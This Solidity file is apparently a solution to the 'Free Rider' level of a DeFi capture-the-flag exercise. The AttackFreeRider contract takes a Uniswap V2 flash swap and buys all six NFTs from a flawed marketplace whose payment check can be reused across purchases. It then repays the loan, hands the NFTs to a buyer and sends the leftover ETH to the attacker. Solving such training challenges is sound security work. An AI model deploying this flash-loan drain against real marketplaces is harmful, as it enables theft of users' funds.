// SPDX-License-Identifier: MIT
pragma solidity >=0.8.1;

import "forge-std/console.sol";
import {IERC721} from "openzeppelin-contracts/token/ERC721/IERC721.sol";
import {FreeRiderNFTMarketplace} from "src/Contracts/free-rider/FreeRiderNFTMarketplace.sol";
import {DamnValuableNFT} from "src/Contracts/DamnValuableNFT.sol";
import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "src/Contracts/free-rider/Interfaces.sol";
import {WETH9} from "src/Contracts/WETH9.sol";

contract AttackFreeRider {
  IERC721 private immutable nft;
  FreeRiderNFTMarketplace private immutable marketplace;
  IUniswapV2Pair private immutable pair;
  WETH9 private immutable weth;
  address payable attacker;
  address buyer;

  uint256[] tokenIds = [0, 1, 2, 3, 4, 5];

  constructor(address _nft, address payable _marketplace, address uniswap, address _buyer, address payable _weth){
    attacker = payable(msg.sender);
    nft = IERC721(_nft);
    weth = WETH9(_weth);
    marketplace = FreeRiderNFTMarketplace(_marketplace);
    pair = IUniswapV2Pair(uniswap);
    buyer = _buyer;
  }

  function attack2() external payable {
    // pair.swap(15 ether, 15 ether, address(this), "1");
    pair.swap(15 ether, 15 ether, address(this), "1");
  }

  receive() external payable {}

  function uniswapV2Call(address, uint amount_dvt, uint amount_weth, bytes calldata) public payable {
    weth.withdraw(amount_weth);

    (bool nftsBought, ) = address(marketplace).call{value: amount_weth}(
      abi.encodeWithSignature("buyMany(uint256[])", tokenIds)
    );
    
    uint256 _fee = (uint256(amount_weth * 3) / uint256(997)) + 1;
    uint256 _repayAmount = _fee + amount_weth * 2;

    weth.deposit{value: _repayAmount}();
    weth.transfer(address(pair), _repayAmount);

    require(weth.balanceOf(address(this)) == 0, "should have 0");
    require(nft.balanceOf(address(this)) == 6, "should buy every nft");

    for (uint256 i = 0; i < 6; i++) {
      nft.safeTransferFrom(address(this), buyer, tokenIds[i]);
    }

    (bool ethSent, ) = attacker.call{value: address(this).balance}("");
  }

  function onERC721Received(address, address, uint256, bytes memory)
      external
      pure
      returns (bytes4)
  {
    return 0x150b7a02;
    // return IERC721Receiver.onERC721Received.selector;
  }
}

